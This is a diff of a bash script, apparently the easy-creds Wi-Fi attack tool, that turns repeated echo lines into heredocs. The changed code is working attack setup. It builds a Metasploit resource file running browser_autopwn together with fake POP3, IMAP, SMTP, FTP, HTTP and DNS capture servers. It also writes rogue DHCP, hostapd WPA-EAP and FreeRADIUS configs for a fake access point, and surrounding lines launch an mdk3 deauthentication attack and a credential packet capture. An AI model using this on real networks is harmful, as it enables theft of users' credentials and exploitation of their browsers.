@@ -729,17 +729,20 @@ f_ipcalc(){
 	ATLEND=$(echo $ATLENDTMP.200)
 
 	echo -e "\n\n\e[1;33m[*] Creating a dhcpd.conf to assign addresses to clients that connect to us.\e[0m"
-	echo "ddns-update-style none;" > $DHCPPATH
-	echo "authoritative;"  >> $DHCPPATH
-	echo "log-facility local7;"  >> $DHCPPATH
-	echo "subnet $ATNET netmask $ATSUB {"  >> $DHCPPATH
-	echo "	range $ATLSTART $ATLEND;"  >> $DHCPPATH
-	echo "	option domain-name-servers $ATDNS;"  >> $DHCPPATH
-	echo "	option routers $ATIP;"  >> $DHCPPATH
-	echo "	option broadcast-address $ATBROAD;"  >> $DHCPPATH
-	echo "	default-lease-time 600;" >> $DHCPPATH
-	echo "	max-lease-time 7200;"  >> $DHCPPATH
-	echo "}" >> $DHCPPATH
+
+	cat <<-EOF > ${DHCPPATH}
+		ddns-update-style none;
+		authoritative;
+		log-facility local7;
+		subnet $ATNET netmask $ATSUB {
+			range $ATLSTART $ATLEND;
+			option domain-name-servers $ATDNS;
+			option routers $ATIP;
+			option broadcast-address $ATBROAD;
+			default-lease-time 600;
+			max-lease-time 7200;
+		}
+	EOF
 }
 
 
@@ -1061,7 +1064,7 @@ f_getbssids(){
 	if [ -z $isxrunning ]; then
 		screen -S easy-creds -t MDK3-AP-DoS -X screen mdk3 $airomon d -b /tmp/ec/ec-dosap;(airmon-ng stop $airomon >/dev/null)
 		echo -e "\n Exit the MDK3-AP-DoS in the easy-creds session to stop the attack"
-		sleep 5 
+		sleep 5
 	else
 		xterm -geometry 70x10+0-0 -T "MDK3 AP DoS" -e mdk3 $airomon d -b /tmp/ec/ec-dosap;(airmon-ng stop $airomon >/dev/null) &
 		echo -e "\nPlease close the xterm window to stop the attack..."
@@ -1120,65 +1123,67 @@ f_karmadhcp(){
 
 ##################################################
 f_karmasetup(){
-	echo "use auxiliary/server/browser_autopwn" >> /tmp/ec/karma.rc
-	echo "setg AUTOPWN_HOST $ATIP" >> /tmp/ec/karma.rc
-	echo "setg AUTOPWN_PORT 55550" >> /tmp/ec/karma.rc
-	echo "setg AUTOPWN_URI /ads" >> /tmp/ec/karma.rc
-	echo "set LHOST $ATIP" >> /tmp/ec/karma.rc
-	echo "set LPORT 45000" >> /tmp/ec/karma.rc
-	echo "set SRVPORT 55550" >> /tmp/ec/karma.rc
-	echo "set URIPATH /ads" >> /tmp/ec/karma.rc
-	echo "run" >> /tmp/ec/karma.rc
-	echo "use auxiliary/server/capture/pop3" >> /tmp/ec/karma.rc
-	echo "set SRVPORT 110" >> /tmp/ec/karma.rc
-	echo "set SSL false" >> /tmp/ec/karma.rc
-	echo "run" >> /tmp/ec/karma.rc
-	echo "use auxiliary/server/capture/pop3" >> /tmp/ec/karma.rc
-	echo "set SRVPORT 995" >> /tmp/ec/karma.rc
-	echo "set SSL true" >> /tmp/ec/karma.rc
-	echo "run" >> /tmp/ec/karma.rc
-	echo "use auxiliary/server/capture/ftp" >> /tmp/ec/karma.rc
-	echo "run" >> /tmp/ec/karma.rc
-	echo "use auxiliary/server/capture/imap" >> /tmp/ec/karma.rc
-	echo "set SSL false" >> /tmp/ec/karma.rc
-	echo "set SRVPORT 143" >> /tmp/ec/karma.rc
-	echo "run" >> /tmp/ec/karma.rc
-	echo "use auxiliary/server/capture/imap" >> /tmp/ec/karma.rc
-	echo "set SSL true" >> /tmp/ec/karma.rc
-	echo "set SRVPORT 993" >> /tmp/ec/karma.rc
-	echo "run" >> /tmp/ec/karma.rc
-	echo "use auxiliary/server/capture/smtp" >> /tmp/ec/karma.rc
-	echo "set SSL false" >> /tmp/ec/karma.rc
-	echo "set SRVPORT 25" >> /tmp/ec/karma.rc
-	echo "run" >> /tmp/ec/karma.rc
-	echo "use auxiliary/server/capture/smtp" >> /tmp/ec/karma.rc
-	echo "set SSL true" >> /tmp/ec/karma.rc
-	echo "set SRVPORT 465" >> /tmp/ec/karma.rc
-	echo "run" >> /tmp/ec/karma.rc
-	echo "use auxiliary/server/fakedns" >> /tmp/ec/karma.rc
-	echo "unset TARGETHOST" >> /tmp/ec/karma.rc
-	echo "set SRVPORT 5353" >> /tmp/ec/karma.rc
-	echo "run" >> /tmp/ec/karma.rc
-	echo "use auxiliary/server/fakedns" >> /tmp/ec/karma.rc
-	echo "unset TARGETHOST" >> /tmp/ec/karma.rc
-	echo "set SRVPORT 53" >> /tmp/ec/karma.rc
-	echo "run" >> /tmp/ec/karma.rc
-	echo "use auxiliary/server/capture/http" >> /tmp/ec/karma.rc
-	echo "set SRVPORT 80" >> /tmp/ec/karma.rc
-	echo "set SSL false" >> /tmp/ec/karma.rc
-	echo "run" >> /tmp/ec/karma.rc
-	echo "use auxiliary/server/capture/http" >> /tmp/ec/karma.rc
-	echo "set SRVPORT 8080" >> /tmp/ec/karma.rc
-	echo "set SSL false" >> /tmp/ec/karma.rc
-	echo "run" >> /tmp/ec/karma.rc
-	echo "use auxiliary/server/capture/http" >> /tmp/ec/karma.rc
-	echo "set SRVPORT 443" >> /tmp/ec/karma.rc
-	echo "set SSL true" >> /tmp/ec/karma.rc
-	echo "run" >> /tmp/ec/karma.rc
-	echo "use auxiliary/server/capture/http" >> /tmp/ec/karma.rc
-	echo "set SRVPORT 8443" >> /tmp/ec/karma.rc
-	echo "set SSL true" >> /tmp/ec/karma.rc
-	echo "run" >> /tmp/ec/karma.rc
+	cat <<-EOF > /tmp/ec/karma.rc
+		use auxiliary/server/browser_autopwn
+		setg AUTOPWN_HOST $ATIP
+		setg AUTOPWN_PORT 55550
+		setg AUTOPWN_URI /ads
+		set LHOST $ATIP
+		set LPORT 45000
+		set SRVPORT 55550
+		set URIPATH /ads
+		run
+		use auxiliary/server/capture/pop3
+		set SRVPORT 110
+		set SSL false
+		run
+		use auxiliary/server/capture/pop3
+		set SRVPORT 995
+		set SSL true
+		run
+		use auxiliary/server/capture/ftp
+		run
+		use auxiliary/server/capture/imap
+		set SSL false
+		set SRVPORT 143
+		run
+		use auxiliary/server/capture/imap
+		set SSL true
+		set SRVPORT 993
+		run
+		use auxiliary/server/capture/smtp
+		set SSL false
+		set SRVPORT 25
+		run
+		use auxiliary/server/capture/smtp
+		set SSL true
+		set SRVPORT 465
+		run
+		use auxiliary/server/fakedns
+		unset TARGETHOST
+		set SRVPORT 5353
+		run
+		use auxiliary/server/fakedns
+		unset TARGETHOST
+		set SRVPORT 53
+		run
+		use auxiliary/server/capture/http
+		set SRVPORT 80
+		set SSL false
+		run
+		use auxiliary/server/capture/http
+		set SRVPORT 8080
+		set SSL false
+		run
+		use auxiliary/server/capture/http
+		set SRVPORT 443
+		set SSL true
+		run
+		use auxiliary/server/capture/http
+		set SRVPORT 8443
+		set SSL true
+		run
+	EOF
 }
 
 
@@ -1296,30 +1301,26 @@ f_freeradiusattack(){
 
 ##################################################
 f_buildclientsconf(){
-
-	echo "client localhost {" > $pathtoradiusconf/clients.conf
-	echo "	ipaddr = 127.0.0.1" >> $pathtoradiusconf/clients.conf
-	echo "        secret = $radiussecret" >> $pathtoradiusconf/clients.conf
-	echo "	      require_message_authenticator = no" >> $pathtoradiusconf/clients.conf
-	echo "        nastype = other" >> $pathtoradiusconf/clients.conf
-	echo "}"  >> $pathtoradiusconf/clients.conf
-	echo "client 192.168.0.0/16 {"  >> $pathtoradiusconf/clients.conf
-	echo "       secret = $radiussecret" >> $pathtoradiusconf/clients.conf
-	echo "       shortname = testAP" >> $pathtoradiusconf/clients.conf
-	echo "}"  >> $pathtoradiusconf/clients.conf
-	echo "client 172.16.0.0/12 {"  >> $pathtoradiusconf/clients.conf
-	echo "       secret = $radiussecret" >> $pathtoradiusconf/clients.conf
-	echo "       shortname = testAP" >> $pathtoradiusconf/clients.conf
-	echo "}"  >> $pathtoradiusconf/clients.conf
-	echo "client 10.0.0.0/8 {"  >> $pathtoradiusconf/clients.conf
-	echo "       secret = $radiussecret" >> $pathtoradiusconf/clients.conf
-	echo "       shortname = testAP" >> $pathtoradiusconf/clients.conf
-	echo "}" >> $pathtoradiusconf/clients.conf
-	# echo "client $ATCIDR {"  >> $pathtoradiusconf/clients.conf
-	# echo "       secret = $radiussecret" >> $pathtoradiusconf/clients.conf
-	# echo "       shortname = testAP" >> $pathtoradiusconf/clients.conf
-	# echo "}" >> $pathtoradiusconf/clients.conf
-
+	cat <<-EOF > ${pathtoradiusconf}/clients.conf
+		client localhost {
+			ipaddr = 127.0.0.1
+			secret = $radiussecret
+			require_message_authenticator = no
+			nastype = other
+		}
+		client 192.168.0.0/16 {
+			secret = $radiussecret
+			shortname = testAP
+		}
+		client 172.16.0.0/12 {
+			secret = $radiussecret
+			shortname = testAP
+		}
+		client 10.0.0.0/8 {
+			secret = $radiussecret
+			shortname = testAP
+		}
+	EOF
 }
 
 
@@ -1343,23 +1344,25 @@ f_hostapd(){
 	 read -p " : " radchannel
 	done
 
-	echo "interface=$radwiface" > /tmp/ec/ec-hostapd.conf
-	echo "driver=nl80211" >> /tmp/ec/ec-hostapd.conf
-	echo "ssid=$radssid" >> /tmp/ec/ec-hostapd.conf
-	echo "logger_stdout=-1" >> /tmp/ec/ec-hostapd.conf
-	echo "logger_stdout_level=0" >> /tmp/ec/ec-hostapd.conf
-	echo "dump_file=/tmp/hostapd.dump" >> /tmp/ec/ec-hostapd.conf
-	echo "ieee8021x=1" >> /tmp/ec/ec-hostapd.conf
-	echo "eapol_key_index_workaround=0" >> /tmp/ec/ec-hostapd.conf
-	echo "own_ip_addr=127.0.0.1" >> /tmp/ec/ec-hostapd.conf
-	echo "auth_server_addr=127.0.0.1" >> /tmp/ec/ec-hostapd.conf
-	echo "auth_server_port=1812" >> /tmp/ec/ec-hostapd.conf
-	echo "auth_server_shared_secret=$radiussecret" >> /tmp/ec/ec-hostapd.conf
-	echo "wpa=1" >> /tmp/ec/ec-hostapd.conf
-	echo "hw_mode=g" >> /tmp/ec/ec-hostapd.conf
-	echo "channel=$radchannel" >> /tmp/ec/ec-hostapd.conf
-	echo "wpa_pairwise=TKIP CCMP" >> /tmp/ec/ec-hostapd.conf
-	echo "wpa_key_mgmt=WPA-EAP" >> /tmp/ec/ec-hostapd.conf
+	cat <<-EOF > /tmp/ec/ec-hostapd.conf
+		interface=$radwiface
+		driver=nl80211
+		ssid=$radssid
+		logger_stdout=-1
+		logger_stdout_level=0
+		dump_file=/tmp/hostapd.dump
+		ieee8021x=1
+		eapol_key_index_workaround=0
+		own_ip_addr=127.0.0.1
+		auth_server_addr=127.0.0.1
+		auth_server_port=1812
+		auth_server_shared_secret=$radiussecret
+		wpa=1
+		hw_mode=g
+		channel=$radchannel
+		wpa_pairwise=TKIP CCMP
+		wpa_key_mgmt=WPA-EAP
+	EOF
 }
 
 
@@ -1404,7 +1407,7 @@ f_freeradiusfinal(){
 	 screen -S easy-creds -X select 2
 	 screen -S easy-creds -X logfile $logfldr/freeradius-creds-$(date +%F-%H%M).txt
 	 screen -S easy-creds -X log
-	 echo $! > /tmp/ec/tail.pid 
+	 echo $! > /tmp/ec/tail.pid
 	fi
 
 	tshark -i $radwiface -w $logfldr/freeradius-creds-$(date +%F-%H%M).dump &> /dev/null &
@@ -1500,7 +1503,7 @@ f_EtterLog(){
 	  echo "Ettercap logs in current log folder:"
 	  ls $logfldr/*.eci 2>/dev/null
 	  echo -e "\n\n"
-	fi 
+	fi
 
 	ETTERECI=
 	while [ -z $ETTERECI ] || [ ! -f "$ETTERECI" ]; do read -e -p "Enter the full path to your ettercap.eci log file: " ETTERECI; done
